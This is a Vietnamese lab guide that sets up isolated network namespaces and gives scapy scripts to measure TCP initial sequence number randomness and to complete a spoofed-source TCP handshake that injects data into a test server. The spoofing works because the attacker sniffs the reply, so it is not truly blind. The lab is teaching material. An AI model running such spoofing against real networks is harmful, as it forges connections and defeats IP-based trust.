# HƯỚNG DẪN THỰC HÀNH: LAB 01
## TCP ISN Prediction & Blind Spoofing Attack

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Đo lường độ ngẫu nhiên của số thứ tự khởi tạo TCP (ISN) theo RFC 6528, sau đó thực hiện tấn công bắt tay 3 bước TCP giả mạo IP nguồn (Blind TCP Spoofing) và bơm tải dữ liệu vào máy chủ nạn nhân.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim Server) trên `veth2`
  - Địa chỉ giả mạo (Spoofed IP): `10.0.0.77`

> 💡 **Quy ước thực thi lệnh:**
> - `[VICTIM - h2]`: Lệnh chạy trong namespace nạn nhân (tiền tố `ip netns exec h2`).
> - `[ATTACKER - h1]`: Lệnh chạy trong namespace kẻ tấn công (tiền tố `ip netns exec h1`).
> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab01` và tạo 3 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab01 && cd /tmp/lab01

# 1. Script thiết lập mạng: setup_pair.sh
cat << 'EOF' > /tmp/lab01/setup_pair.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ nếu có..."
ip netns del h1 2>/dev/null || true
ip netns del h2 2>/dev/null || true

echo "[*] Tạo 2 namespace h1 (Attacker) và h2 (Victim)..."
ip netns add h1
ip netns add h2

echo "[*] Tạo veth pair nối h1 và h2..."
ip link add veth1 type veth peer name veth2
ip link set veth1 netns h1
ip link set veth2 netns h2

echo "[*] Cấu hình địa chỉ IP..."
ip netns exec h1 ip link set dev lo up
ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
ip netns exec h1 ip link set dev veth1 up

ip netns exec h2 ip link set dev lo up
ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
ip netns exec h2 ip link set dev veth2 up

# Tĩnh ARP trên h2 cho IP giả mạo 10.0.0.77 trỏ về MAC của veth1
VETH1_MAC=$(ip netns exec h1 cat /sys/class/net/veth1/address)
ip netns exec h2 ip neigh replace 10.0.0.77 lladdr "$VETH1_MAC" dev veth2

# Chặn kernel h1 tự động gửi RST làm hỏng phiên bắt tay giả mạo
ip netns exec h1 iptables -F
ip netns exec h1 iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

echo "[+] Kiểm tra ping baseline giữa h1 và h2:"
ip netns exec h1 ping -c 2 10.0.0.2
echo "[+] Khởi tạo môi trường hoàn tất!"
EOF
chmod +x /tmp/lab01/setup_pair.sh

# 2. Script thu thập 30 ISN: isn_sampler.py
cat << 'EOF' > /tmp/lab01/isn_sampler.py
#!/usr/bin/env python3
import time
from scapy.all import IP, TCP, sr1

target_ip = "10.0.0.2"
target_port = 9000
samples = []

print(f"[*] Đang thu thập 30 mẫu ISN từ {target_ip}:{target_port}...")
for i in range(30):
    sport = 20000 + i
    syn = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S", seq=100)
    ans = sr1(syn, timeout=1, verbose=0)
    if ans and ans.haslayer(TCP):
        isn = ans[TCP].seq
        samples.append(isn)
        delta = (isn - samples[-2]) if len(samples) > 1 else 0
        print(f"Mẫu #{i+1:02d}: ISN={isn:<10} | Delta={delta}")
    time.sleep(0.05)
EOF

# 3. Script giả mạo bắt tay 3 bước: spoof_sniff.py
cat << 'EOF' > /tmp/lab01/spoof_sniff.py
#!/usr/bin/env python3
import random
from scapy.all import IP, TCP, Raw, send, sniff

target_ip = "10.0.0.2"
target_port = 8080
spoofed_ip = "10.0.0.77"
sport = random.randint(30000, 60000)
my_isn = 1000

print(f"[*] Bắt đầu bắt tay 3 bước từ IP giả mạo: {spoofed_ip}")
syn = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S", seq=my_isn)
send(syn, iface="veth1", verbose=0)
print(f"[+] Đã gửi SYN (seq={my_isn})")

print("[*] Đang đón bắt SYN-ACK trên veth1...")
pkts = sniff(iface="veth1", filter=f"tcp and src host {target_ip} and dst host {spoofed_ip} and src port {target_port}", count=1, timeout=3)

if pkts:
    syn_ack = pkts[0]
    server_isn = syn_ack[TCP].seq
    print(f"[+] Bắt được SYN-ACK! Server ISN = {server_isn}")
    
    # Gửi ACK hoàn tất bắt tay 3 bước
    ack = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="A", seq=my_isn+1, ack=server_isn+1)
    send(ack, iface="veth1", verbose=0)
    print(f"[+] Đã gửi ACK (ack={server_isn+1})")
    
    # Bơm payload dữ liệu
    payload = b"hello-from-spoofed-source\n"
    psh = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="PA", seq=my_isn+1, ack=server_isn+1) / Raw(load=payload)
    send(psh, iface="veth1", verbose=0)
    print(f"[+] Đã bơm dữ liệu: {payload.strip()}")
else:
    print("[-] Hết thời gian chờ (Timeout), không nhận được SYN-ACK!")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG

```bash
# [HOST / CHUNG] Thiết lập topology h1 <-> h2
sudo bash /tmp/lab01/setup_pair.sh
```

---

### 4. BƯỚC 3: THU THẬP & ĐÁNH GIÁ ĐỘ NGẪU NHIÊN CỦA ISN

1. **[VICTIM - h2]** Mở dịch vụ ncat trên cổng 9000:
   ```bash
   sudo ip netns exec h2 ncat -lvk -p 9000 >/dev/null 2>&1 &
   NCAT_SAMPLER_PID=$!
   ```
2. **[ATTACKER - h1]** Chạy lấy mẫu 30 ISN gửi tới Victim:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab01/isn_sampler.py
   sudo kill $NCAT_SAMPLER_PID 2>/dev/null || true
   ```
   > **Quan sát:** Các giá trị Delta giữa các ISN biến thiên ngẫu nhiên (dương, âm, hàng trăm triệu đơn vị), chứng minh Linux Kernel tuân thủ RFC 6528 sử dụng PRNG mật mã, không thể đoán trước bằng thuật toán tuyến tính.

---

### 5. BƯỚC 4: THỰC HIỆN TẤN CÔNG BẮT TAY GIẢ MẠO (SPOOFING)

1. **[VICTIM - h2]** Mở dịch vụ nhận dữ liệu trên cổng 8080:
   ```bash
   sudo ip netns exec h2 ncat -lvk -p 8080 > /tmp/lab01/ncat_server.log 2>&1 &
   NCAT_PID=$!
   ```
2. **[VICTIM - h2]** Mở tcpdump trên giao diện `veth2` để ghi nhận gói tin:
   ```bash
   sudo ip netns exec h2 tcpdump -i veth2 -nn "tcp port 8080" > /tmp/lab01/tcpdump_h2.log 2>&1 &
   sleep 1
   ```
3. **[ATTACKER - h1]** Chạy script tấn công giả mạo bắt tay 3 bước từ IP `10.0.0.77`:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab01/spoof_sniff.py
   sleep 2
   ```

---

### 6. BƯỚC 5: KIỂM CHỨNG KẾT QUẢ

1. **[VICTIM - h2]** Kiểm tra log ncat trên nạn nhân:
   ```bash
   cat /tmp/lab01/ncat_server.log
   ```
   *Kỳ vọng:* Hiển thị kết nối từ `10.0.0.77` và nhận được chuỗi `hello-from-spoofed-source`.

2. **[VICTIM - h2]** Kiểm tra log bắt gói tcpdump:
   ```bash
   cat /tmp/lab01/tcpdump_h2.log
   ```
   *Kỳ vọng:* Thấy gói tin SYN từ `10.0.0.77`, SYN-ACK từ `10.0.0.2`, ACK từ `10.0.0.77` và gói ACK cuối của nạn nhân xác nhận đã nhận 26 bytes data (`ack 1027`).

---

### 7. BƯỚC 6: DỌN DẸP MÔI TRƯỜNG

```bash
# [HOST / CHUNG] Tắt tiến trình nền và xóa namespaces
sudo pkill -f ncat 2>/dev/null || true
sudo pkill -f tcpdump 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -rf /tmp/lab01
```
